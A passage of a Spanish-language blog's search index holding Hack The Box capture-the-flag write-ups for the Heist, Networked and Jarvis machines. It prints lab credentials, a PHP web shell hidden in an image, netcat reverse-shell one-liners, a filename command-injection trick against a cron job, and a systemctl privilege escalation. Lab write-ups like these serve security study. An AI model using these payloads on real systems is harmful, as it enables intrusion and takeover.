root@kali:~/htb/heist/evil-winrm# lookupsid.py hazard:stealth1agent@10.10.10.149 Impacket v0.9.20-dev - Copyright 2019 SecureAuth Corporation [*] Brute forcing SIDs at 10.10.10.149 [*] StringBinding ncacn_np:10.10.10.149[\\pipe\\lsarpc] [*] Domain SID is: S-1-5-21-4254423774-1266059056-3197185112 500: SUPPORTDESK\\Administrator (SidTypeUser) 501: SUPPORTDESK\\Guest (SidTypeUser) 503: SUPPORTDESK\\DefaultAccount (SidTypeUser) 504: SUPPORTDESK\\WDAGUtilityAccount (SidTypeUser) 513: SUPPORTDESK\\None (SidTypeGroup) 1008: SUPPORTDESK\\Hazard (SidTypeUser) 1009: SUPPORTDESK\\support (SidTypeUser) 1012: SUPPORTDESK\\Chase (SidTypeUser) 1013: SUPPORTDESK\\Jason (SidTypeUser) CREDENCIALES hazard:stealth1agent\rrout3r:$uperP@ssword\radmin:Q4)sJu\\Y8qz*A3?d\rchase:Q4)sJu\\Y8qz*A3?d\rjason:\rsupport: CHASE - USER WinRm Dentro de los puertos abiertos que encontramos vemos que winrm (5985) esta abierto, utilizamos las credenciales y usuarios que encontramos para intentar logearnos mediante este puerto.\nUtilizamos un script en ruby con la libreria winrm para poder ejecutar comandos:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 require \u0026#39;winrm\u0026#39; conn = WinRM::Connection.new( endpoint: \u0026#39;http://10.10.10.149:5985/wsman\u0026#39;, user: \u0026#39;chase\u0026#39;, password: \u0026#39;Q4)sJu\\Y8qz*A3?d\u0026#39;, ) command=\u0026#34;\u0026#34; conn.shell(:powershell) do |shell| until command == \u0026#34;exit\\n\u0026#34; do print \u0026#34;PS \u0026gt; \u0026#34; command = gets output = shell.run(command) do |stdout, stderr| STDOUT.print stdout STDERR.print stderr end end puts \u0026#34;Exiting with code #{output.exitcode}\u0026#34; end Podemos ejecutar comandos en la maquina y obtenemos nuestra bandera user.txt.\nPRIVILEGE ESCALATION Estando dentro de la maquina buscamos archivos en los cuales pudiesen haber contraseñas, principalmente los archivos que se utilizan en la plataforma/inicio de sesion de la pagina que contiene la maquina. Encontramos que, dentro del archivo login.php hay una condicion con dos usuarios que pueden logearse: guest y admin.\nlogin.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 \u0026lt;?php session_start(); if( isset($_REQUEST[\u0026#39;login\u0026#39;]) \u0026amp;\u0026amp; !empty($_REQUEST[\u0026#39;login_username\u0026#39;]) \u0026amp;\u0026amp; !empty($_REQUEST[\u0026#39;login_password\u0026#39;])) { if( $_REQUEST[\u0026#39;login_username\u0026#39;] === \u0026#39;admin@support.htb\u0026#39; \u0026amp;\u0026amp; hash( \u0026#39;sha256\u0026#39;, $_REQUEST[\u0026#39;login_password\u0026#39;]) === \u0026#39;91c077fb5bcdd1eacf7268c945bc1d1ce2faf9634cba615337adbf0af4db9040\u0026#39;) { $_SESSION[\u0026#39;admin\u0026#39;] = \u0026#34;valid\u0026#34;; header(\u0026#39;Location: issues.php\u0026#39;); } else header(\u0026#39;Location: errorpage.php\u0026#39;); } else if( isset($_GET[\u0026#39;guest\u0026#39;]) ) { if( $_GET[\u0026#39;guest\u0026#39;] === \u0026#39;true\u0026#39; ) { $_SESSION[\u0026#39;guest\u0026#39;] = \u0026#34;valid\u0026#34;; header(\u0026#39;Location: issues.php\u0026#39;); } } ?\u0026gt; Utilizamos la paigna de md5decrypt para verificar si existe esta contraseña dentro de la pagina:\nmd5decrypt admin@support.htb:91c077fb5bcdd1eacf7268c945bc1d1ce2faf9634cba615337adbf0af4db9040\radmin@support.htb:4dD!5}x/re8]FBuZ Verificamos mediante samba que el usuario es administrator y, si este tiene permisos.\nConfirmamos que es el usuario y contraseña de administrator, utilizamos nuevamente el script para winrm con las credenciales.\nObtenemos una shell y nuestra bandera root.txt.\n","description":"Inicialmente se muestra un fichero en la pagina web el cual contiene credenciales cisco encriptadas, con ellas pudimos enumerar algunos usuarios con Impacket y con WinRM obtener acceso. Enumerando los archivos de la pagina inicial encontramos el hash del Adminstrador el cual crackeamos y obtuvimos acceso privilegiado.","id":181,"section":"posts","tags":["smbmap","impacket","winrm"],"title":"Hack The Box - Heist","uri":"https://sckull.github.io/posts/heist/"},{"content":"\rEncontramos una pagina web donde pudimos subir una web shell realizando Bypass utilizando exiftool. Un CronJob nos permitio ejecutar una shell inversa y acceder al siguiente usuario. Escalamos privilegios ejecutando una shell a travez de un script de bash.\nInformacion de la Maquina Nombre Networked OS Linux Puntos 20 Dificultad Facil IP 10.10.10.146 Maker guly\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[5.5, 4.8, 4.2, 5.8, 5.2],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[7, 5, 3, 7, 5],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} MASSCAN \u0026amp; NMAP Escaneo de puertos tcp/udp con masscan y nmap.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 root@kali:~/htb/networked# masscan -p1-65535,U:1-65535 10.10.10.146 --rate=1000 -e tun0 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-08-27 23:43:29 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 80/tcp on 10.10.10.146 Discovered open port 22/tcp on 10.10.10.146 # Nmap 7.70 scan initiated Tue Aug 27 22:49:04 2019 as: nmap -sC -sV -p80,22 -o nmap.scan 10.10.10.146 Nmap scan report for 10.10.10.146 Host is up (0.087s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4 (protocol 2.0) | ssh-hostkey: | 2048 22:75:d7:a7:4f:81:a7:af:52:66:e5:27:44:b1:01:5b (RSA) | 256 2d:63:28:fc:a2:99:c7:d4:35:b9:45:9a:4b:38:f9:c8 (ECDSA) |_ 256 73:cd:a0:5b:84:10:7d:a7:1c:7c:61:1d:f5:54:cf:c4 (ED25519) 80/tcp open http Apache httpd 2.4.6 ((CentOS) PHP/5.4.16) |_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16 |_http-title: Site doesn\u0026#39;t have a title (text/html; charset=UTF-8). Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Aug 27 22:49:14 2019 -- 1 IP address (1 host up) scanned in 10.16 seconds HTTP Visitamos la pagina que se encuentra en el puerto 80 y nos muestra lo siguiente.\nAdemas de eso en el codigo fuente nos muestra un comentario relacionado a una galeria.\nDIRBUSTER Utilizamos dirbuster para busqueda de direcotrios y paginas.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 root@kali:~/htb/networked# gobuster dir -u http://10.10.10.146/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -n -t 15 =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.10.146/ [+] Threads: 15 [+] Wordlist: /usr/share/wordlists/dirb/common.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Extensions: txt,html,php [+] No status: true [+] Timeout: 10s =============================================================== 2019/08/27 22:46:10 Starting gobuster =============================================================== /backup /cgi-bin/ /cgi-bin/.html /index.php /index.php /lib.php /photos.php /upload.php /uploads =============================================================== 2019/08/27 22:48:15 Finished =============================================================== BACKUP - backup.tar Visitamos la pagina backup y encontramos un archivo \u0026lsquo;backup.tar\u0026rsquo; que al extraer los archivos que contiene nos muestra el codigo fuente de las paginas que encontramos con dirbuster.\nAnalizamos el codigo fuente de los archivos, encontramos que, en la pagina upload.php podemos subir archivos de los cuales solo archivos de tipo imagen estan permitidos.\nBYPASS - Upload Shell Utilizamos exiftool para añadir codigo php para ejecucion de comandos en una de las imagenes que descargamos de photos.php, luego de esto cambiamos el nombre del archivo y le añadimos .php.jpg como extension.\n1 2 exiftool -Comment=\u0026#39;\u0026lt;?php echo \u0026#34;\u0026lt;pre\u0026gt;\u0026#34;; system($_GET[\u0026#39;cmd\u0026#39;]); ?\u0026gt;\u0026#39; 127.jpg mv 127.jpg 127.php.jpg Visitamos la pagina photos.php y nos aparece nuestra imagen/shell uploaded by 10_10_15_129.php.png.\nLe pasamos los parametros ?cmd=whoami;pwd a nuestra imagen y nos devuelve la ejecucion de comandos, un tanto desordenada con los datos de la imagen.\nLe pasamos parametros para obtener una shell inversa con netcat.\n1 nc -e /bin/bash 10.10.15.129 1337 Obtenemos nuestra shell como usuario apache.\nUSUARIO - GULY Dentro de los archivos que encontramos en la carpeta principal del usuario guly, de los cuales podemos leer solo dos, vemos un archivo de tipo cronjob y uno de php.\nEl archivo cron se encarga de ejecutar el comando php /home/guly/check_attack.php cada 3 mins.\nEl segundo archivo evalua los archivos que se encuentran en /var/www/html/uploads/, si encuentra un archivo que no esta dentro de las extensiones del whitelist de lib.php lo elimina, pero lo hace con los siguientes comandos:\n1 2 exec(\u0026#34;rm -f $logpath\u0026#34;); exec(\u0026#34;nohup /bin/rm -f $path$value \u0026gt; /dev/null 2\u0026gt;\u0026amp;1 \u0026amp;\u0026#34;); Las variables que nos interesan son:\n1 2 $path = \u0026#39;/var/www/html/uploads/\u0026#39;; $logpath = \u0026#39;/tmp/attack.log\u0026#39;; Sabiendo esto vamos a aprovechar la segunda ejecucion de comandos, en la cual se le pasa los parametros:\n1 nohup /bin/rm -f $path$value \u0026gt; /dev/null 2\u0026gt;\u0026amp;1 \u0026amp; En este caso toma la variable $path donde se encuentran todos los archivos y $value el nombre del archivo a eliminar, en este caso seria de la siguiente forma /var/www/html/uploads/whatever.php, para aprovechar este comando utilizamos touch para crear el siguiente archivo (nombre):\n1 ; nc -c bash 10.10.15.129 1338 Y para cuando el cron se active y ejecute el archivo y, al borrar nuestro archivo va a ejecutar lo siguiente:\n1 nohup /bin/rm -f /var/www/html/uploads/; nc -c bash 10.10.15.129 1338 \u0026gt; /dev/null 2\u0026gt;\u0026amp;1 \u0026amp; Por lo que va a ejecutar nuestra shell inversa y obtenemos nuestra bandera user.txt.\nPRIVILEGE ESCALATION Agregamos nuestra clave a authorized_keys del usuario guly y nos logeamos al servicio ssh. Ejecutamos el comando sudo -l -l y nos muestra un archivo que se ejecuta como usuario root.\nJail Escaping Bash Utilizamos la \u0026ldquo;tecnica\u0026rdquo; para escapar de una shell bash. Para ello al preguntarnos sobre las variables le pasamos un comando el cual va a ejecutar.\nJail Escaping Bash\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 /usr/local/sbin/changename.sh #!/bin/bash -p cat \u0026gt; /etc/sysconfig/network-scripts/ifcfg-guly \u0026lt;\u0026lt; EoF DEVICE=guly0 ONBOOT=no NM_CONTROLLED=no EoF regexp=\u0026#34;^[a-zA-Z0-9_\\ /-]+$\u0026#34; for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do echo \u0026#34;interface $var:\u0026#34; read x while [[ ! $x =~ $regexp ]]; do echo \u0026#34;wrong input, try again\u0026#34; echo \u0026#34;interface $var:\u0026#34; read x done echo $var=$x \u0026gt;\u0026gt; /etc/sysconfig/network-scripts/ifcfg-guly done /sbin/ifup guly0 Antes de eso creamos un archivo el cual contiene una shell inversa, le damos permisos con el comando chmod +x archivo. Luego de eso ejecutamos el archivo con el comando sudo y le pasamos el comando bash /tmp/sh.\nPor otro lado tenemos a la escucha netcat y obtenemos una shell con el usuario root y nuestra bandera root.txt.\n","description":"Encontramos una pagina web donde pudimos subir una web shell realizando Bypass utilizando exiftool. Un CronJob nos permitio ejecutar una shell inversa y acceder al siguiente usuario. Escalamos privilegios ejecutando una shell a travez de un script de bash.","id":182,"section":"posts","tags":["Jail Escaping Bash","exiftool","cron"],"title":"Hack The Box - Networked","uri":"https://sckull.github.io/posts/networked/"},{"content":"\rAl enumerar el sitio web descubrimos una vulnerabilidad SQL Injection y que con SQLmap obtuvimos una shell inversa. Mediante sudo y escapando un script en Python cambiamos al siguiente usuario. Los permisos de Systemctl permitió escalar privilegios creando un servicio nuevo.\nInformacion de la Maquina Nombre Jarvis OS Linux Puntos 30 Dificultad Media IP 10.10.10.143 Maker manulqwerty Ghostpp7 Matrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[6.7, 6.8, 6.1, 3.9, 3.2],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[0, 0, 0, 0, 0],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} MASSCAN \u0026amp; NMAP Escaneo de puertos tcp/udp, version de servicio y script con nmap.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 root@sckull:~/htb/jarvis# masscan -p1-65535,U:1-65535 10.10.10.143 --rate=1000 -e tun0 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-07-06 09:51:52 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 80/tcp on 10.10.10.143 Discovered open port 64999/tcp on 10.10.10.143 Discovered open port 22/tcp on 10.10.10.143 # Nmap 7.70 scan initiated Sat Jul 6 03:58:17 2019 as: nmap -sV -sC -p80,64999,22 -o nmap_scsvp.scan 10.10.10.143 Nmap scan report for 10.10.10.143 Host is up (0.083s latency).\tPORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0) | ssh-hostkey: | 2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA) | 256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA) |_ 256 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 (ED25519) 80/tcp open http Apache httpd 2.4.25 ((Debian)) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: Apache/2.4.25 (Debian) |_http-title: Stark Hotel 64999/tcp open http Apache httpd 2.4.25 ((Debian)) |_http-server-header: Apache/2.4.25 (Debian) |_http-title: Site doesn\u0026#39;t have a title (text/html). Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Jul 6 03:58:33 2019 -- 1 IP address (1 host up) scanned in 16.02 seconds HTTP - Puerto 80 Realizamos un escaneo de archivos/directorios en la pagina web con DIRB.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 ----------------- DIRB v2.22 By The Dark Raver ----------------- START_TIME: Thu Jul 25 15:30:40 2019 URL_BASE: http://10.10.10.143/ WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt ----------------- GENERATED WORDS: 4612 ---- Scanning URL: http://10.10.10.143/ ---- ==\u0026gt; DIRECTORY: http://10.10.10.143/css/ ==\u0026gt; DIRECTORY: http://10.10.10.143/fonts/ ==\u0026gt; DIRECTORY: http://10.10.10.143/images/ + http://10.10.10.143/index.php (CODE:200|SIZE:23628) ==\u0026gt; DIRECTORY: http://10.10.10.143/js/ ==\u0026gt; DIRECTORY: http://10.10.10.143/phpmyadmin/ + http://10.10.10.143/server-status (CODE:403|SIZE:300) ---- Entering directory: http://10.10.10.143/css/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode \u0026#39;-w\u0026#39; if you want to scan it anyway) ---- Entering directory: http://10.10.10.143/fonts/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode \u0026#39;-w\u0026#39; if you want to scan it anyway) ---- Entering directory: http://10.10.10.143/images/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode \u0026#39;-w\u0026#39; if you want to scan it anyway) ---- Entering directory: http://10.10.10.143/js/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode \u0026#39;-w\u0026#39; if you want to scan it anyway) ---- Entering directory: http://10.10.10.143/phpmyadmin/ ---- + http://10.10.10.143/phpmyadmin/ChangeLog (CODE:200|SIZE:19186) ==\u0026gt; DIRECTORY: http://10.10.10.143/phpmyadmin/doc/ ==\u0026gt; DIRECTORY: http://10.10.10.143/phpmyadmin/examples/ + http://10.10.10.143/phpmyadmin/favicon.ico (CODE:200|SIZE:22486) + http://10.10.10.143/phpmyadmin/index.php (CODE:200|SIZE:15211) ==\u0026gt; DIRECTORY: http://10.10.10.143/phpmyadmin/js/ ==\u0026gt; DIRECTORY: http://10.10.10.143/phpmyadmin/libraries/ + http://10.10.10.143/phpmyadmin/LICENSE (CODE:200|SIZE:18092) ==\u0026gt; DIRECTORY: http://10.10.10.143/phpmyadmin/locale/ + http://10.10.10.143/phpmyadmin/phpinfo.php (CODE:200|SIZE:15215) + http://10.10.10.143/phpmyadmin/README (CODE:200|SIZE:1520) + http://10.10.10.143/phpmyadmin/robots.txt (CODE:200|SIZE:26) ==\u0026gt; DIRECTORY: http://10.10.10.143/phpmyadmin/setup/ ==\u0026gt; DIRECTORY: http://10.10.10.143/phpmyadmin/sql/ ==\u0026gt; DIRECTORY: http://10.10.10.143/phpmyadmin/templates/ ==\u0026gt; DIRECTORY: http://10.10.10.143/phpmyadmin/themes/ ==\u0026gt; DIRECTORY: http://10.10.10.143/phpmyadmin/tmp/ ==\u0026gt; DIRECTORY: http://10.10.10.143/phpmyadmin/vendor/ ---- Entering directory: http://10.10.10.143/phpmyadmin/doc/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode \u0026#39;-w\u0026#39; if you want to scan it anyway) ---- Entering directory: http://10.10.10.143/phpmyadmin/examples/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode \u0026#39;-w\u0026#39; if you want to scan it anyway) ---- Entering directory: http://10.10.10.143/phpmyadmin/js/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode \u0026#39;-w\u0026#39; if you want to scan it anyway) ---- Entering directory: http://10.10.10.143/phpmyadmin/libraries/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode \u0026#39;-w\u0026#39; if you want to scan it anyway) ---- Entering directory: http://10.10.10.143/phpmyadmin/locale/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode \u0026#39;-w\u0026#39; if you want to scan it anyway) ---- Entering directory: http://10.10.10.143/phpmyadmin/setup/ ---- ==\u0026gt; DIRECTORY: http://10.10.10.143/phpmyadmin/setup/frames/ + http://10.10.10.143/phpmyadmin/setup/index.php (CODE:200|SIZE:10541) ==\u0026gt; DIRECTORY: http://10.10.10.143/phpmyadmin/setup/lib/ ---- Entering directory: http://10.10.10.143/phpmyadmin/sql/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode \u0026#39;-w\u0026#39; if you want to scan it anyway) ---- Entering directory: http://10.10.10.143/phpmyadmin/templates/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode \u0026#39;-w\u0026#39; if you want to scan it anyway) ---- Entering directory: http://10.10.10.143/phpmyadmin/themes/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode \u0026#39;-w\u0026#39; if you want to scan it anyway) ---- Entering directory: http://10.10.10.143/phpmyadmin/tmp/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode \u0026#39;-w\u0026#39; if you want to scan it anyway) ---- Entering directory: http://10.10.10.143/phpmyadmin/vendor/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode \u0026#39;-w\u0026#39; if you want to scan it anyway) ---- Entering directory: http://10.10.10.143/phpmyadmin/setup/frames/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode \u0026#39;-w\u0026#39; if you want to scan it anyway) ---- Entering directory: http://10.10.10.143/phpmyadmin/setup/lib/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode \u0026#39;-w\u0026#39; if you want to scan it anyway) ----------------- END_TIME: Thu Jul 25 16:38:46 2019 DOWNLOADED: 13836 - FOUND: 10 Encontramos un panel de administracion de phpmyadmin, al intentar ingresar con credenciales por default no fue posible.\nSQLi Realizamos una busqueda de vulnerabilidades dentro de la pagina web viendo parametros en urls, encontramos que en la pagina rooms se encuentra una vulnerabilidad de tipo sql injection.\n1 http://supersecurehotel.htb/room.php?cod=1 Utilizamos sqlmap para poder explotar esta vulnerabilidad y encontramos distintas bases de datos.\nSQLMAP Dentro de las bases de datos que encontramos no vimos nada que pudiese ayudar a obtener acceso a la maquina.\n1 2 3 4 5 6 7 8 9 10 sqlmap -u \u0026#34;10.10.10.143/room.php?cod=1\u0026#34; --dbs --batch available databases [7]: [*] etgkt [*] hotel [*] information_schema [*] mysql [*] performance_schema [*] secret [*] test SQLMAP - OS-SHELL Utilizamos el parametro de sqlmap que nos devuelve una shell, en la cual podemos ejecutar comandos del sistema.\n1 sqlmap -u \u0026#34;10.10.10.143/room.php?cod=1\u0026#34; --os-shell Obtenemos una shell con el usuario www-data:\nPara obtener una shell inversa creamos un archivo llamado shell.sh, configuramos un servidor con python y con la shell de sqlmap descargamos el archivo y lo ejecutamos.\n1 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.10.14.174 7878 \u0026gt;/tmp/f Shell inversa:\nShell - Pepper Enumeramos un poco el sistema y encontramos un script con el comando sudo -l -l, dicho archivo puede ser ejecutado por cualquier usuario con el comando sudo -u pepper ./simpler.py.\nAl analizar el codigo del archivo encontramos que al pasarle el parametro \u0026lsquo;-p\u0026rsquo; este ejecuta un ping sobre una IP que se le pasa, pero en la funcion no nos permite ejecutar un comando extra ademas de la IP que se le pasa.\n1 2 3 4 5 6 7 8 def exec_ping(): forbidden = [\u0026#39;\u0026amp;\u0026#39;,\u0026#39;;\u0026#39;,\u0026#39;-\u0026#39;,\u0026#39;`\u0026#39;,\u0026#39;||\u0026#39;,\u0026#39;|\u0026#39;,] command = input(\u0026#39;Enter an IP: \u0026#39;) for i in forbidden: if i in command: print \u0026#39;Got you\u0026#39; exit() os.system(\u0026#39;ping \u0026#39; + command) Para poder escapar los caracteres \u0026amp;,;,-,``,||,| vamos a utilizar una variable la cual va ejecutar nuestra shell inversa, esta ultima la creamos en el directorio /tmp:\n1 nc -e /bin/bash 10.10.14.174 8989 Para obtener una shell con el usuario Pepper utilizamos los siguientes comandos, Ejecucion del script:\n1 sudo -u pepper /var/www/Admin-Utilities/simpler.py -p Parametro cuando nos lo pida:\n1 \u0026#34;$(bash /tmp/x.sh)\u0026#34; Obtenemos nuestra shell inversa y nuestra flag user.txt:\nYa que tenemos acceso al usuario Pepper agregamos nuestra llave publica a authorized_keys para poder ingresar mediante el servicio ssh.\nPRIVILEGE ESCALATION Realizamos una enumeracion de los archivos SUID en la maquina y encontramos /bin/systemctl.\nUtilizamos la informacion que nos proporciona GTFObins.\nUtilizamos los comandos:\n1 TF=/tmp/priv.service;echo \u0026#39;[Service]\u0026#39; \u0026gt; $TF;echo \u0026#39;Type=oneshot\u0026#39; \u0026gt;\u0026gt; $TF;echo \u0026#39;ExecStart=/bin/sh -c \u0026#34;nc -e /bin/bash 10.10.14.174 1331\u0026#34;\u0026#39; \u0026gt;\u0026gt; $TF;echo \u0026#39;[Install]\u0026#39; \u0026gt;\u0026gt; $TF;echo \u0026#39;WantedBy=multi-user.target\u0026#39; \u0026gt;\u0026gt; $TF 1 systemctl link $TF;systemctl enable --now $TF Obtenemos una shell como usuario root y nuestra flag root.txt:\nFlag:\n","description":"Al enumerar el sitio web descubrimos una vulnerabilidad SQL Injection y que con SQLmap obtuvimos una shell inversa. Mediante sudo y escapando un script en Python cambiamos al siguiente usuario. Los permisos de Systemctl permitió escalar privilegios creando un servicio nuevo.","id":183,"section":"posts","tags":["sqlmap","suid","systemctl"],"title":"Hack The Box - Jarvis","uri":"https://sckull.github.io/posts/jarvis/"},{"content":"\rEnumeramos Elasticsearch en donde encontramos credenciales para obtener acceso por SSH. Encontramos Kibana el cual obtuvimos localmente con SSH que ademas explotamos una vulnerabilidad la cual nos dio acceso al siguiente usuario. Un CronJob con Logstash nos dio una shell como usuario root.\nInformacion de la Maquina Nombre Haystack OS Linux Puntos 20 Dificultad Facil IP 10.10.10.115 Maker JoyDragon\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[6.6, 4.5, 6.1, 3.9, 5.5],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[0, 0, 0, 0, 0],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} MASSCAN \u0026amp; NMAP Escaneo de puertos tcp/udp y su servicio.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 masscan -p1-65535,U:1-65535 10.10.10.115 --rate=1000 -e tun1 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-06-30 00:02:40 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 22/tcp on 10.10.10.115 Discovered open port 80/tcp on 10.10.10.115 Discovered open port 9200/tcp on 10.10.10.115 # Nmap 7.70 scan initiated Sat Jun 29 21:50:27 2019 